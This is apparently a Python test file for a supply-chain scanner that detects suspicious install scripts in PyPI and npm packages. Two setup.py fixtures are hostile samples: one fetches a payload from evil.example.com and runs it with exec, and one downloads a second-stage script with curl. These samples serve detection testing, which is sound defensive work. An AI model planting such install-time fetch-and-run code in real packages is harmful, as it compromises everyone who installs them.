import io
import tarfile
from pathlib import Path

from sc_scanner.graph.npm_resolver import NpmRegistryClient
from sc_scanner.graph.pypi_resolver import PyPIClient
from sc_scanner.heuristics.install_scripts import (
    SetupPyInspector,
    check_npm_install_script,
    check_npm_install_script_from_lockfile,
    check_pypi_install_script,
    _scan_source,
)
from sc_scanner.models import Dependency, Ecosystem
from tests.fakes import FakeResponse, FakeSession

BENIGN_SETUP_PY = """
from setuptools import setup

setup(name="benign-package", version="1.0.0", packages=["benign_package"])
"""

VERSION_LOADING_SETUP_PY = """
from setuptools import setup

with open("benign_package/_version.py") as f:
    exec(f.read())

setup(name="benign-package", version=__version__)
"""

MALICIOUS_SETUP_PY = """
from setuptools import setup
import urllib.request

payload = urllib.request.urlopen("http://evil.example.com/payload.py").read()
exec(payload)

setup(name="evil-package", version="1.0.0")
"""

SHELL_DOWNLOAD_SETUP_PY = """
from setuptools import setup
import subprocess

subprocess.run(["curl", "-s", "http://evil.example.com/stage2.sh", "-o", "/tmp/x"])

setup(name="evil-package", version="1.0.0")
"""

BENIGN_SUBPROCESS_SETUP_PY = """
from setuptools import setup
import subprocess

subprocess.run(["gcc", "-c", "native.c"])

setup(name="native-package", version="1.0.0")
"""


def _make_sdist(package_dir: str, setup_py_source: str) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        data = setup_py_source.encode("utf-8")
        info = tarfile.TarInfo(name=f"{package_dir}/setup.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


# --- pure AST-scanning function ---


def test_scan_source_detects_nothing_in_a_benign_setup_py():
    has_exec_or_eval, has_network_call = _scan_source(BENIGN_SETUP_PY)
    assert not has_exec_or_eval
    assert not has_network_call


def test_scan_source_flags_version_loading_exec_but_not_as_network():
    has_exec_or_eval, has_network_call = _scan_source(VERSION_LOADING_SETUP_PY)
    assert has_exec_or_eval
    assert not has_network_call


def test_scan_source_flags_network_fetch_plus_exec_as_both():
    has_exec_or_eval, has_network_call = _scan_source(MALICIOUS_SETUP_PY)
    assert has_exec_or_eval
    assert has_network_call


def test_scan_source_flags_shell_download_via_subprocess():
    has_exec_or_eval, has_network_call = _scan_source(SHELL_DOWNLOAD_SETUP_PY)
    assert has_network_call


def test_scan_source_does_not_flag_benign_subprocess_use():
    has_exec_or_eval, has_network_call = _scan_source(BENIGN_SUBPROCESS_SETUP_PY)
    assert not has_network_call
    assert not has_exec_or_eval


def test_scan_source_handles_unparseable_source_gracefully():
    has_exec_or_eval, has_network_call = _scan_source("this is not ( valid python")
    assert not has_exec_or_eval
    assert not has_network_call


# --- full check_pypi_install_script flow, mocked network ---


def _pypi_client_and_inspector(tmp_path: Path, responses) -> tuple[PyPIClient, SetupPyInspector]:
    # get_release() and the sdist download both go through the same fake
    # session, in the order the code under test actually calls them.
    session = FakeSession(responses)
    pypi_client = PyPIClient(cache_dir=tmp_path / "pypi-cache", session=session, backoff_seconds=0)
    inspector = SetupPyInspector(cache_dir=tmp_path / "setup-scan-cache", session=session, backoff_seconds=0)
    return pypi_client, inspector


def test_check_pypi_install_script_flags_malicious_looking_setup_py(tmp_path):
    dep = Dependency(name="evil-package", version="1.0.0", ecosystem=Ecosystem.PYPI)
    release = {"urls": [{"packagetype": "sdist", "url": "https://example.com/evil-1.0.0.tar.gz"}]}
    tarball = _make_sdist("evil-package-1.0.0", MALICIOUS_SETUP_PY)

    pypi_client, inspector = _pypi_client_and_inspector(
        tmp_path, [FakeResponse(200, release), FakeResponse(200, content=tarball)]
    )

    signal = check_pypi_install_script(dep, pypi_client, inspector)

    assert signal is not None
    assert signal.score > 0.9


def test_check_pypi_install_script_does_not_flag_a_benign_package(tmp_path):
    dep = Dependency(name="benign-package", version="1.0.0", ecosystem=Ecosystem.PYPI)
    release = {"urls": [{"packagetype": "sdist", "url": "https://example.com/benign-1.0.0.tar.gz"}]}
    tarball = _make_sdist("benign-package-1.0.0", BENIGN_SETUP_PY)

    pypi_client, inspector = _pypi_client_and_inspector(
        tmp_path, [FakeResponse(200, release), FakeResponse(200, content=tarball)]
    )

    assert check_pypi_install_script(dep, pypi_client, inspector) is None


def test_check_pypi_install_script_scores_bare_exec_lower_than_network_call(tmp_path):
    version_dep = Dependency(name="benign-package", version="1.0.0", ecosystem=Ecosystem.PYPI)
    release = {"urls": [{"packagetype": "sdist", "url": "https://example.com/benign-1.0.0.tar.gz"}]}
    tarball = _make_sdist("benign-package-1.0.0", VERSION_LOADING_SETUP_PY)

    pypi_client, inspector = _pypi_client_and_inspector(
        tmp_path, [FakeResponse(200, release), FakeResponse(200, content=tarball)]
    )

    signal = check_pypi_install_script(version_dep, pypi_client, inspector)

    assert signal is not None
    assert signal.score < 0.5


def test_check_pypi_install_script_returns_none_when_no_sdist_is_published(tmp_path):
    dep = Dependency(name="wheel-only-package", version="1.0.0", ecosystem=Ecosystem.PYPI)
    release = {"urls": [{"packagetype": "bdist_wheel", "url": "https://example.com/x.whl"}]}

    pypi_client, inspector = _pypi_client_and_inspector(tmp_path, [FakeResponse(200, release)])

    assert check_pypi_install_script(dep, pypi_client, inspector) is None


# --- npm hook detection ---


def _npm_client(tmp_path: Path, responses) -> NpmRegistryClient:
    return NpmRegistryClient(
        cache_dir=tmp_path / "npm-cache", session=FakeSession(responses), backoff_seconds=0
    )


def test_check_npm_install_script_flags_has_install_script_flag(tmp_path):
    dep = Dependency(name="native-thing", version="1.0.0", ecosystem=Ecosystem.NPM)
    package = {"versions": {"1.0.0": {"hasInstallScript": True}}}
    client = _npm_client(tmp_path, [FakeResponse(200, package)])

    signal = check_npm_install_script(dep, client)

    assert signal is not None
    assert "install" in signal.evidence


def test_check_npm_install_script_returns_none_without_the_flag(tmp_path):
    dep = Dependency(name="plain-package", version="1.0.0", ecosystem=Ecosystem.NPM)
    package = {"versions": {"1.0.0": {}}}
    client = _npm_client(tmp_path, [FakeResponse(200, package)])

    assert check_npm_install_script(dep, client) is None


def test_check_npm_install_script_from_lockfile_flag():
    dep = Dependency(name="native-thing", version="1.0.0", ecosystem=Ecosystem.NPM)

    assert check_npm_install_script_from_lockfile(dep, True) is not None
    assert check_npm_install_script_from_lockfile(dep, False) is None
